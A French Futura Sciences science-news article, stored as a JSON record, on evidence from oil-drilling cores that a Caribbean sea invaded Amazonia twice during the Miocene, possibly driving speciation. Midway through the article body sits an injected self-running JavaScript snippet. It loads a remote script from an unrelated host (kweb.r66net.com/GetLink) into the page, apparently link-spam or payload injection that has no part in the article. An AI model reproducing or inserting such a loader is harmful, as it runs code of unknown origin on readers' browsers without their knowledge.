{"title": "Une mer aurait envahi l'Amazonie par deux fois", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-05-09", "content": "Les archives sedimentaires de l'Amazonie au Miocene, il y a environ 15 millions d'annees, viennent de livrer des indications qui suggerent qu'elle a ete partiellement sous la mer a deux reprises. Ces evenements seraient a l'origine de la diversite de la vie en Amazonie. Ce qu'il faut retenir L'examen de carottes prelevees lors de forages pour la prospection petroliere a revele la presence de deux transgressions marines dans une large portion de l'Amazonie. Survenues pendant le Miocene il y a environ 15 millions d'annees, elles auraient accelere la speciation en creant de nombreuses iles transitoires, ce qui expliquerait la grande diversite de la biosphere en Amazonie. Il y a quelques mois, nous apprenions qu'un continent perdu appele  Zealandia , reste cache parce qu'il se trouvait depuis des millions d'annees sous la surface de l'ocean Pacifique, avait ete decouvert. Nous ne serons donc pas tres surpris d'apprendre que depuis quelques decennies, les paleogeographes et les geologues discutent de l'existence d'une possible mer qui aurait submerge une partie de l'Amazonie il y a environ 15 millions d'annees. En fait, les chercheurs sont d'accord entre eux pour admettre l'existence de vastes etendues d'eau a cette epoque dans la partie ouest de l'Amazonie, pendant le  Miocene , et donc peu avant la formation de l' isthme de Panama . Ce qui les divise c'est de savoir s'il s'agissait d'une  transgression marine  avec l'avancee sur une partie du continent de la mer des Caraibes, qui aurait donne la  mer Pebas , ou si c'etait plutot de tres grands lacs d' eau douce  provenant de cours d'eau issus des Andes en pleine surrection tectonique. En tout etat de cause, il y aurait eu un resultat similaire du point de vue de la  biosphere , une explosion de la diversite et donc de la  speciation  en raison de l'existence d'un grand nombre de petites iles pendant quelques centaines de milliers a quelques millions d'annees. C'est ce qui expliquerait que l'Amazonie contient environ 10 % de toutes les  especes  de la planete sur une surface de 6,7 millions de kilometres carres. Un des forages effectues par une compagnie petroliere en Colombie et dont les carottes ont ete etudiees par les chercheurs. (c) Geominas S.A. et Hocol S.A                       Un scenario avec deux transgressions marines en Amazonie au Miocene Mais comment les chercheurs sont-ils arrives a cette hypothese ? Tout simplement en fouillant les archives sedimentaires qui gardent la memoire des environnements dans lesquels elles se sont formees, ainsi que des formes de vies qui les habitaient. Une equipe internationale de specialistes en geosciences menee par le paleontologue Carlos Jaramillo du  Smithsonian Tropical Research Institute  a Panama vient de faire savoir  via  un article dans  Science Advances  que non seulement elle pensait avoir consolide l'hypothese de la transgression marine mais qu'il y en aurait eu deux !  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Jaramillo et ses collegues ont en effet eu acces a une manne inesperee alors qu'ils ne disposaient que de peu d'echantillons de roches datant du Miocene, des forages effectues par des compagnies petrolieres. Ils ont fourni des  carottes  larges de 6 cm remontees d'une profondeur pouvant aller jusqu'a 600 metres. L'un d'eux avait ete effectue a l'est de la Colombie et l'autre au nord-est du Bresil. L'examen de ces carottes a permis de mettre en evidence l'existence de deux  strates  bien distinctes qui contenaient des grains de pollen  fossiles  deposes en milieu marin, et surtout une dent de requin et des restes d'une  squille (ou crevette-mante)  en complement des  micro-organismes  planctoniques connus depuis les annees 1990. Ces strates alternaient avec des couches sedimentaires contenant des pollens qui ne sont pas deposes en milieu marin. Une dent de requin retrouvee dans une carotte de sediment du basin de l'Amazonie. (c) Jorge Carillo                               Ces donnees permettent de construire desormais le scenario suivant : la mer des Caraibes se serait donc avancee une premiere fois il y a entre 18 et 17 millions d'annees et une seconde fois, il y a entre 16 et 12 millions d'annees. Le nord-est du Bresil aurait donc ete sous la surface de la mer pendant 200.000 a 400.000 ans alors que dans le cas de la Colombie, la transgression marine se serait installee durant 900.000 ans a 3,7 millions d'annees. Ces regions auraient ensuite ete recouvertes par des sediments apportes par les rivieres des Andes. Autrefois dans le camp de ceux qui refusaient l'existence des transgressions marines, Jaramillo fait desormais partie des << convertis >>. Mais son collegue Paul Baker, geologue a l'universite de Durham (Royaume-Uni), bien qu'il admette partiellement l'existence d'une incursion marine courte, reste convaincu que le scenario principal reste celui des vastes etendues d'eau douce. Pour changer d'avis, il lui faudrait les resultats de mesures des abondances d' isotopes de l'oxygene  contenus dans les  coquilles  des animaux decouverts dans les couches sedimentaires. Elles permettront de savoir clairement si l'on a affaire a des animaux marins ou pas. Affaire a suivre probablement... ", "theme": "planete"}